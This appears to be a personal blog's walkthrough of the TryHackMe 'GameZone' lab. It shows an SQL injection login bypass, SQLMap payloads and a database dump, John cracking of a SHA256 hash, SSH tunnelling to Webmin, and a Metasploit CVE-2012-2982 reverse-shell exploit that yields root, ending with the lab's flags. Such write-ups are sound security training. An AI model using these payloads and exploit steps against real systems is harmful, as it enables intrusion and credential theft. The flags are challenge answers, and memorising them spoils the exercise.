@@ -1,0 +1,486 @@
+---
+layout: post
+title: THM - GameZone
+author: _f0rmat
+date: 2025-07-24
+tags: TryHackMe SQLi Injection nmap hashcracking
+category: CTF
+---
+
+```
+Difficulty: Medium
+Status: Complete
+IP: 10.10.116.163
+```
+
+# Resolution summary
+- Inital enumeration resulted in a webpage with a login box which was susceptible to SQLi
+- After finding this and a 'valid' login the next page was a search page for the datebase, after capturing the request we used SQLMap to further enumerate which revealed an username and a password hash
+- Used John to crack the password and from this was able to SSH into the machine and get user flag.
+- After setting up a socket to tunnel our machine to the network we could then browse to port 10000 which gave us access to the CMS login panel and with the enumerated details we could log in and find the version number of the CMS system which allowed us to find an exploit using CVE-2012-2982 to give us root access and then gain the root flag.
+
+## Improved skills
+- nmap
+- SQLMap
+- ssh tunneling
+
+## Used tools
+- SQLMap
+- Searchsploit
+- CVE-2012-2982
+
+---
+
+# Information Gathering
+
+Scanned all ports:
+
+```bash
+nmap -p- -T5 10.10.116.163 -v
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+Enumerated open ports:
+
+```bash
+nmap -p 22,80 -A 10.10.116.163 -v
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61ea89f1d4a7dca550f76d89c3af0b03 (RSA)
+|   256 b37d72461ed341b66a911516c94aa5fa (ECDSA)
+|_  256 536709dcfffb3a3efbfecfd86d4127ab (ED25519)
+
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Game Zone
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+---
+
+# Enumeration
+
+## Port 80 - http
+
+Browsing to the http web site we are shown the following page:
+
+[![1](/assets/blog/THM/GameZone/1.png)](/assets/blog/THM/GameZone/1.png)
+
+The Image shown is Hitman Agent 47.
+
+We also have a login box which we can quickly test for SQLi by entering the username of admin and the password of  ' or 1=1 -- -
+
+Which is the equivalent of running the following command in SQL
+
+```shell
+SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
+```
+
+[![2](/assets/blog/THM/GameZone/2.png)](/assets/blog/THM/GameZone/2.png)
+
+It would appear that there is no 'admin' user for this database however we can use the same ' or 1=1 -- - in the username instead;
+
+[![3](/assets/blog/THM/GameZone/3.png)](/assets/blog/THM/GameZone/3.png)
+
+In order to enumerate this machine further we can use a tool called SQLMap.
+
+-----
+# Exploitation
+
+## SQLMAP
+
+In order to use this we will need a request so we open burpsuite and use foxyproxy or the built in browser to intercept the request and then save it to a text file (in this case request.txt)
+
+[![4](/assets/blog/THM/GameZone/4.png)](/assets/blog/THM/GameZone/4.png)
+
+Now we can use SQLMap with our 'authenticated' user session:
+
+```shell
+└─$ sqlmap -r request.txt --dbms=mysql --dump
+```
+
+Results:
+
+```shell
+└─$ sqlmap -r request.txt --dbms=mysql --dump
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.7.2#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:13:37 /2023-05-13/
+
+[09:13:37] [INFO] parsing HTTP request from 'request.txt'
+[09:13:37] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: searchitem=-1338' OR 3684=3684#
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: searchitem=test' AND GTID_SUBSET(CONCAT(0x716a767671,(SELECT (ELT(4123=4123,1))),0x716b786b71),4123)-- Bqqt
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchitem=test' AND (SELECT 2516 FROM (SELECT(SLEEP(5)))Mthy)-- RpRf
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: searchitem=test' UNION ALL SELECT NULL,NULL,CONCAT(0x716a767671,0x716a71644c4479497741746d55616c6d61696346694a545a514957774641684f4a61596c6347626c,0x716b786b71)#
+---
+[09:13:37] [INFO] testing MySQL
+[09:13:37] [INFO] confirming MySQL
+[09:13:37] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.0
+[09:13:37] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[09:13:37] [INFO] fetching current database
+[09:13:37] [INFO] fetching tables for database: 'db'
+[09:13:37] [INFO] fetching columns for table 'users' in database 'db'
+[09:13:37] [INFO] fetching entries for table 'users' in database 'db'
+[09:13:37] [INFO] recognized possible password hashes in column 'pwd'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[09:13:40] [INFO] writing hashes to a temporary file '/tmp/sqlmap1woun6y723513/sqlmaphashes-6damiwrm.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[09:13:41] [INFO] using hash method 'sha256_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[09:13:48] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] n
+[09:13:50] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
+[09:13:50] [INFO] starting 6 processes 
+[09:13:56] [WARNING] no clear password(s) found                                                                                                             
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+[09:13:56] [INFO] table 'db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.116.163/dump/db/users.csv'
+[09:13:56] [INFO] fetching columns for table 'post' in database 'db'
+[09:13:56] [INFO] fetching entries for table 'post' in database 'db'
+Database: db
+Table: post
+[5 entries]
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | name                           | description                                                                                                                                                                                            |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
+| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
+| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
+| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[09:13:56] [INFO] table 'db.post' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.116.163/dump/db/post.csv'
+[09:13:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.116.163'
+
+[*] ending @ 09:13:56 /2023-05-13/
+```
+
+In the users table we have an hashed password of:
+
+```shell
+ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+```
+
+An username of:
+
+```shell
+agent47
+```
+
+And one more detail, another table called;
+
+```shell
+post
+```
+
+---
+
+# Lateral Movement to user
+
+## Local Enumeration
+
+Now we have a password hash we can use the tool John The Ripper to crack the password, first copy the hash to a file (hash.txt) and run the following;
+
+```shell
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+```
+
+Results;
+
+```shell
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=6
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+videogamer124    (?)     
+1g 0:00:00:00 DONE (2023-05-13 09:21) 7.692g/s 22685Kp/s 22685Kc/s 22685KC/s vrunip6..vainlove
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+The password is 'videogamer124'
+
+As we have both an username and password we can now attempt to log in via SSH and begin further enumeration.
+
+```shell
+└─$ ssh agent47@10.10.116.163                
+The authenticity of host '10.10.116.163 (10.10.116.163)' can't be established.
+ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.116.163' (ED25519) to the list of known hosts.
+agent47@10.10.116.163's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+agent47@gamezone:~$ ls
+user.txt
+agent47@gamezone:~$ cat user.txt
+**********************************
+```
+
+We can now further enumerate looking for services and ports on the machine;
+
+If we run ss -tulpn it will tell us what socket connections are running;
+
+```
+Argument	Description
+	-t	Display TCP sockets
+	-u	Display UDP sockets
+	-l	Displays only listening sockets
+	-p	Shows the process using the socket
+	-n	Doesn't resolve service names
+```
+
+```shell
+agent47@gamezone:~$ ss -tulpn
+Netid State      Recv-Q Send-Q                               Local Address:Port                                              Peer Address:Port              
+udp   UNCONN     0      0                                                *:10000                                                        *:*                  
+udp   UNCONN     0      0                                                *:68                                                           *:*                  
+tcp   LISTEN     0      128                                              *:22                                                           *:*                  
+tcp   LISTEN     0      80                                       127.0.0.1:3306                                                         *:*                  
+tcp   LISTEN     0      128                                              *:10000                                                        *:*                  
+tcp   LISTEN     0      128                                             :::22                                                          :::*                  
+tcp   LISTEN     0      128                                             :::80                                                          :::*    
+```
+
+As we can see there are 5 TCP connections listening and we can see port 10000 is running behind a firewall.
+
+If we run the following on our machine;
+
+```shell
+ssh -L 10000:localhost:10000 agent47@10.10.116.163
+```
+
+We can then navigate to port 10000 on our machine with 'localhost:10000' in any browser resulting in this page;
+
+[![5](/assets/blog/THM/GameZone/5.png)](/assets/blog/THM/GameZone/5.png)
+
+We can see that the page is a Webmin login portal and we can log in with our details from before resulting in this page;
+
+[![6](/assets/blog/THM/GameZone/6.png)](/assets/blog/THM/GameZone/6.png)
+
+Which also shows us the version details of the CMS and server running.
+
+---
+
+# Privilege Escalation
+
+## Local Enumeration
+
+## Metasploit
+
+Now we know the version of the CMS running we can use searchsploit to find any exploits.
+
+```shell
+msf6 > searchsploit webmin
+[*] exec: searchsploit webmin
+
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                             | cgi/webapps/23535.txt
+phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                            | php/webapps/2462.txt
+phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                        | php/webapps/2451.txt
+Webmin - Brute Force / Command Execution                                                                                    | multiple/remote/705.pl
+webmin 0.91 - Directory Traversal                                                                                           | cgi/remote/21183.txt
+Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                 | linux/remote/22275.pl
+Webmin 0.x - 'RPC' Privilege Escalation                                                                                     | linux/remote/21765.pl
+Webmin 0.x - Code Input Validation                                                                                          | linux/local/21348.txt
+Webmin 1.5 - Brute Force / Command Execution                                                                                | multiple/remote/746.pl
+Webmin 1.5 - Web Brute Force (CGI)                                                                                          | multiple/remote/745.pl
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                       | unix/remote/21851.rb
+Webmin 1.850 - Multiple Vulnerabilities                                                                                     | cgi/webapps/42989.txt
+Webmin 1.900 - Remote Command Execution (Metasploit)                                                                        | cgi/remote/46201.rb
+Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                      | linux/remote/46984.rb
+Webmin 1.920 - Remote Code Execution                                                                                        | linux/webapps/47293.sh
+Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                           | linux/remote/47230.rb
+Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                             | linux/webapps/49318.rb
+Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                  | linux/webapps/50144.py
+Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                            | linux/webapps/50126.py
+Webmin 1.984 - Remote Code Execution (Authenticated)                                                                        | linux/webapps/50809.py
+Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                                                                  | linux/webapps/50998.py
+Webmin 1.x - HTML Email Command Execution                                                                                   | cgi/webapps/24574.txt
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                | multiple/remote/1997.php
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                | multiple/remote/2017.pl
+Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                               | linux/webapps/47330.rb
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+msf6 > searchsploit -p 21851
+[*] exec: searchsploit -p 21851
+
+  Exploit: Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)
+      URL: https://www.exploit-db.com/exploits/21851
+     Path: /usr/share/exploitdb/exploits/unix/remote/21851.rb
+    Codes: CVE-2012-2982, OSVDB-85248
+ Verified: True
+File Type: Ruby script, ASCII text
+
+```
+
+As above we can see one exploit and it leverages CVE-2012-2982.
+
+To make things easier we can search outright for this CVE to confirm the only one exploit;
+
+```shell
+msf6 > search CVE-2012-2982
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank       Check  Description
+   -  ----                                      ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec  2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/webmin_show_cgi_exec
+```
+
+Now we can configure the exploit;
+
+```shell
+msf6 > use 0
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > options
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting       Required  Description
+   ----      ---------------       --------  -----------
+   PASSWORD  videogamer124         yes       Webmin Password
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    http://127.0.0.1      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT     10000                 yes       The target port (TCP)
+   SSL       false                 yes       Use SSL
+   USERNAME  agent47               yes       Webmin Username
+   VHOST                           no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.14.49.18      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+Now we can run the exploit and it should give us root access;
+
+```shell
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+
+[*] Started reverse TCP double handler on 10.14.49.18:4444 
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo fUE20XQ6xhsqMoVm;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "Trying: not found\r\nsh: 2: Connected: not found\r\nsh: 3: Escape: not found\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (10.14.49.18:4444 -> 10.10.116.163:53056) at 2023-05-13 09:50:57 +0100
+
+
+Shell Banner:
+fUE20XQ6xhsqMoVm
+-----
+          
+whoami
+root
+pwd
+/usr/share/webmin/file/
+cat /root/root.txt
+***********************************
+```
+
+---
+
+# Trophy & Loot
+
+user.txt
+```bash
+649ac17b1480ac13ef1e4fa579dac95c
+```
+
+root.txt
+
+```bash
+a4b945830144bdd71908d12d902adeee
+```
